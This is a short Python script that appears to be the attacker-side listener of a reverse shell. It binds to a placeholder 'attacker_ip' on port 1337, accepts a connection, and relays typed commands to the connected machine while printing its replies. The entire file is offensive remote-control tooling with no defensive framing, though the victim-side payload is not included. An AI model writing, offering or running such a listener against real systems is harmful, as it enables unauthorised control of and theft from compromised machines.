import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()
print(f"Connected to {address}")

while True:
	inp = input(">> ")
	connection.send(bytes(inp, "utf-8"))
	
	recv = connection.recv(2048)
	print(recv.decode("utf-8"))
